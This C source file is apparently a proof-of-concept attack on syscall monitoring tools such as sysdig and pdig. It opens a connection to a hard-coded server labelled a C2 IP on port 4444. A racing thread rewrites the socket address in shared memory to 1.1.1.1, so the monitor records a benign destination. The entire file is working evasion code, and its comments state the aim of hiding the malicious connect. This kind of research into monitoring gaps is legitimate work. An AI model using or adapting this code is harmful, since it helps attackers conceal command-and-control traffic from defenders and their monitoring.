#define _GNU_SOURCE
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <errno.h>
#include <unistd.h>
/* mmap */
#include <sys/mman.h>
/* string */
#include <string.h>
/* compile without -m32 for 64 bit call numbers */
#include <asm/unistd.h>      
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>

#define NANOSLEEP_TIME 900000000

#define FORCE_INLINE __attribute__((always_inline)) inline

#define handle_error_en(en, msg) \
  do { errno = (long)en; perror(msg); exit(EXIT_FAILURE); } while (0)

static int page_size;
static volatile char *page = NULL;

/* we try to overwrite our C2 Ip with a benign IP (1.1.1.1)
 * so that sysdig/pdig can't detect this malicious connect.
 * This is an arbitrary IP we want sysdig/pdig to report */
static volatile void 
write_ip_addr(struct sockaddr_in *serv_addr) 
{
  //const char benign_ip[] = "13.107.42.14";
  const char benign_ip[] = "1.1.1.1";
  struct hostent *server  = gethostbyname(benign_ip);
  bcopy((char *)server->h_addr, (char *)&serv_addr->sin_addr.s_addr, server->h_length);
}

FORCE_INLINE int 
nanosleep_helper(long nsec) 
{
   struct timespec req, rem;
   req.tv_sec = 0;
   req.tv_nsec = nsec;

   ssize_t ret;
   
   asm volatile
   (
     "syscall"
     : "=a" (ret)
     /*                      RDI      RSI     */
     : "0"(__NR_nanosleep), "D"(&req), "S"(&rem)
     : "rcx", "r11", "memory"
   );
   return ret;
}

static void *
thread_start(void *arg) 
{
  nanosleep_helper(NANOSLEEP_TIME);
  write_ip_addr((struct sockaddr_in*)page);
  
  return NULL;
}

void 
do_connect(struct sockaddr_in *serv_addr) 
{
  int sockfd, portno, n;
  struct hostent *server;

  char buffer[256];
  //portno = 80;
  portno = 4444;

  /* Create a socket point */
  sockfd = socket(AF_INET, SOCK_STREAM, 0);

  if (sockfd < 0) {
    perror("ERROR opening socket");
    exit(1);
  }

  /* This is our C2 IP */
  // local test
  // const char malicious_ip[] = "192.168.153.182";
  // aws test
  const char malicious_ip[] = "18.118.35.14";
  
  server = gethostbyname(malicious_ip);

  if (server == NULL) {
    fprintf(stderr,"ERROR, no such host\n");
    exit(0);
  }

  bzero((char *) serv_addr, sizeof(*serv_addr));
  serv_addr->sin_family = AF_INET;
  bcopy((char *)server->h_addr, (char *)&serv_addr->sin_addr.s_addr, server->h_length);
  serv_addr->sin_port = htons(portno);

  /* Now connect to the server */
  printf("%d\n", serv_addr->sin_addr.s_addr);
  if (connect(sockfd, (struct sockaddr*)serv_addr, sizeof(*serv_addr)) < 0) {
    perror("****************** ERROR connecting: is server listening? *********************");
    exit(1);
  }
}

int
main(int argc, char *argv[]) 
{
  int s;
  pthread_t thread;

  /* set up the page */
  page_size = sysconf(_SC_PAGE_SIZE);
  page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (page == MAP_FAILED)
      handle_error_en(page, "mmap failure");

  /* start new thread */
  s = pthread_create(&thread, NULL, &thread_start, NULL);
  if (s != 0)
    handle_error_en(s, "pthread_create");

  /* connect syscall */
  do_connect((struct sockaddr_in*)page);
  exit(EXIT_SUCCESS);
}
